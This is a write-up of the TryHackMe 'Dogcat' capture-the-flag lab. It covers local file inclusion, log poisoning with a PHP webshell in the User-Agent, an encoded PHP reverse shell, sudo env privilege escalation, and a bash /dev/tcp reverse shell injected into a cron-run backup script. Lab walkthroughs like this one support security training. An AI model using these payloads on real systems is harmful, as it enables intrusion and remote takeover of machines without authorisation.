---
title: Dogcat Tryhackme Writeup
published: true
---

Today I bring you the writeup of [Dogcat](https://tryhackme.com/room/dogcat), a tryhackme machine focused on web exploitation, here we go!

First we start with a port scan to see which ports are open.

```shell
nmap -p- --min-rate 5000 IP
```

With -p- we indicate that we want it to look at all ports and the --min-rate 5000 to do it very fast.

![](https://raw.githubusercontent.com/M4luk0/m4luk0.github.io/master/images/dogcat_writeup/1.png)

Now that we know the ports, let's scan them deeply to see versions and so on.

```shell
nmap -sC -sV -p22,80 --min-rate 5000 IP
```

With -sC we indicate that we want to run the default nmap scripts and -sV to get the service versions.

![](https://raw.githubusercontent.com/M4luk0/m4luk0.github.io/master/images/dogcat_writeup/2.png)

If we go to the website we see the following:

![](https://raw.githubusercontent.com/M4luk0/m4luk0.github.io/master/images/dogcat_writeup/3.png)

If we click on the buttons "a dog" and "a cat" we see that it shows us a picture of a cat or a dog; but let's see the url.

![](https://raw.githubusercontent.com/M4luk0/m4luk0.github.io/master/images/dogcat_writeup/5.png)

It looks like we can try a [file inclusion](https://m4luk0.github.io/File-Inclusion), after a few tests I realized it was a [file inclusion from an existing folder](https://book.hacktricks.xyz/pentesting-web/file-inclusion#from-existent-folder), so I decided to try to read the index to see how the php worked and exploit it; to read it I had to use a [php filter](https://book.hacktricks.xyz/pentesting-web/file-inclusion#wrapper-php-filter):

```shell
?view=php://filter/convert.base64-encode/resource=dog/../index
```

![](https://raw.githubusercontent.com/M4luk0/m4luk0.github.io/master/images/dogcat_writeup/6.png)

Now we have to [decrypt](https://gchq.github.io/CyberChef/#recipe=From_Base64('A-Za-z0-9%2B/%3D',true)&input=UENGRVQwTlVXVkJGSUVoVVRVdytDanhvZEcxc1Bnb0tQR2hsWVdRK0NpQWdJQ0E4ZEdsMGJHVStaRzluWTJGMFBDOTBhWFJzWlQ0S0lDQWdJRHhzYVc1cklISmxiRDBpYzNSNWJHVnphR1ZsZENJZ2RIbHdaVDBpZEdWNGRDOWpjM01pSUdoeVpXWTlJaTl6ZEhsc1pTNWpjM01pUGdvOEwyaGxZV1ErQ2dvOFltOWtlVDRLSUNBZ0lEeG9NVDVrYjJkallYUThMMmd4UGdvZ0lDQWdQR2srWVNCbllXeHNaWEo1SUc5bUlIWmhjbWx2ZFhNZ1pHOW5jeUJ2Y2lCallYUnpQQzlwUGdvS0lDQWdJRHhrYVhZK0NpQWdJQ0FnSUNBZ1BHZ3lQbGRvWVhRZ2QyOTFiR1FnZVc5MUlHeHBhMlVnZEc4Z2MyVmxQend2YURJK0NpQWdJQ0FnSUNBZ1BHRWdhSEpsWmowaUx6OTJhV1YzUFdSdlp5SStQR0oxZEhSdmJpQnBaRDBpWkc5bklqNUJJR1J2Wnp3dlluVjBkRzl1UGp3dllUNGdQR0VnYUhKbFpqMGlMejkyYVdWM1BXTmhkQ0krUEdKMWRIUnZiaUJwWkQwaVkyRjBJajVCSUdOaGREd3ZZblYwZEc5dVBqd3ZZVDQ4WW5JK0NpQWdJQ0FnSUNBZ1BEOXdhSEFLSUNBZ0lDQWdJQ0FnSUNBZ1puVnVZM1JwYjI0Z1kyOXVkR0ZwYm5OVGRISW9KSE4wY2l3Z0pITjFZbk4wY2lrZ2V3b2dJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ2NtVjBkWEp1SUhOMGNuQnZjeWdrYzNSeUxDQWtjM1ZpYzNSeUtTQWhQVDBnWm1Gc2MyVTdDaUFnSUNBZ0lDQWdJQ0FnSUgwS0NTQWdJQ0FrWlhoMElEMGdhWE56WlhRb0pGOUhSVlJiSW1WNGRDSmRLU0EvSUNSZlIwVlVXeUpsZUhRaVhTQTZJQ2N1Y0dod0p6c0tJQ0FnSUNBZ0lDQWdJQ0FnYVdZb2FYTnpaWFFvSkY5SFJWUmJKM1pwWlhjblhTa3BJSHNLSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJR2xtS0dOdmJuUmhhVzV6VTNSeUtDUmZSMFZVV3lkMmFXVjNKMTBzSUNka2IyY25LU0I4ZkNCamIyNTBZV2x1YzFOMGNpZ2tYMGRGVkZzbmRtbGxkeWRkTENBblkyRjBKeWtwSUhzS0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQmxZMmh2SUNkSVpYSmxJSGx2ZFNCbmJ5RW5Pd29nSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUdsdVkyeDFaR1VnSkY5SFJWUmJKM1pwWlhjblhTQXVJQ1JsZUhRN0NpQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNCOUlHVnNjMlVnZXdvZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lHVmphRzhnSjFOdmNuSjVMQ0J2Ym14NUlHUnZaM01nYjNJZ1kyRjBjeUJoY21VZ1lXeHNiM2RsWkM0bk93b2dJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ2ZRb2dJQ0FnSUNBZ0lDQWdJQ0I5Q2lBZ0lDQWdJQ0FnUHo0S0lDQWdJRHd2WkdsMlBnbzhMMkp2WkhrK0NnbzhMMmgwYld3K0NnPT0) that base 64 to read the code well, when doing so we find this.

```php
$ext = isset($_GET["ext"]) ? $_GET["ext"] : '.php';
if(isset($_GET['view'])) {
    if(containsStr($_GET['view'], 'dog') || containsStr($_GET['view'], 'cat')) {
        echo 'Here you go!';
        include $_GET['view'] . $ext;
    } else {
        echo 'Sorry, only dogs or cats are allowed.';
    }
}
```

We see that the parameter "ext" specifies that the file it reads is php, but if we put the empty parameter in the url we should be able to read whatever we want; taking this into account, we can try to read the [apache log](https://book.hacktricks.xyz/pentesting-web/file-inclusion#via-apache-log-file) and from there change the User-Agent putting ```<?php system($_GET['cmd']);?>``` and thus, when reading the log, we can execute commands because when it reaches that part of the log when reading it, it will execute it.

```shell
?view=dog/../../../../../../var/log/apache2/access.log&ext
```

![](https://raw.githubusercontent.com/M4luk0/m4luk0.github.io/master/images/dogcat_writeup/7.png)

```shell
User-Agent: <?php system($_GET['cmd']); ?>
```

![](https://raw.githubusercontent.com/M4luk0/m4luk0.github.io/master/images/dogcat_writeup/8.png)

```shell
?view=dog/../../../../../../var/log/apache2/access.log&ext&cmd=whoami
```

![](https://raw.githubusercontent.com/M4luk0/m4luk0.github.io/master/images/dogcat_writeup/9.png)

Now we are going to execute a reverse shell to connect, first, we open a port.

```shell
nc -lvp PORT
```

![](https://raw.githubusercontent.com/M4luk0/m4luk0.github.io/master/images/dogcat_writeup/10.png)

And now we run the reverse

```shell
?view=dog/../../../../var/log/apache2/access.log&ext=&cmd=php%20-r%20%27%24sock%3Dfsockopen(%22IP%22%2C%20PORT)%3Bexec(%22%2Fbin%2Fbash%20-i%20%3C%263%20%3E%263%202%3E%263%22)%3B%27
```

![](https://raw.githubusercontent.com/M4luk0/m4luk0.github.io/master/images/dogcat_writeup/11.png)

![](https://raw.githubusercontent.com/M4luk0/m4luk0.github.io/master/images/dogcat_writeup/12.png)

And we are in, now to escalate privileges, let's check sudo permissions with ```sudo -l```

![](https://raw.githubusercontent.com/M4luk0/m4luk0.github.io/master/images/dogcat_writeup/13.png)

We see that you have [env](https://gtfobins.github.io/gtfobins/env/#sudo) as root, let's use it to scale!

```shell
sudo env /bin/sh
```

![](https://raw.githubusercontent.com/M4luk0/m4luk0.github.io/master/images/dogcat_writeup/14.png)

It would seem that we have finished the machine, but no, we are missing a flag; to locate it we go to /opt/backups and we see a script, backup.sh that tells us that we are inside a container; to exit, we have to modify the script

![](https://raw.githubusercontent.com/M4luk0/m4luk0.github.io/master/images/dogcat_writeup/15.png)

It seems that this script is executed every x time, we are going to open a port in the same way we did before and we are going to modify the script.

In our machine:

```shell
nc -lvp PORT
```

In the victim's machine:

```shell
echo "#!/bin/bash" > backup.sh
echo "bash -c 'exec bash -i &>/dev/tcp/IP/PORT <&1'" > backup.sh
```

![](https://raw.githubusercontent.com/M4luk0/m4luk0.github.io/master/images/dogcat_writeup/16.png)

And now yes, the machine is rooted!
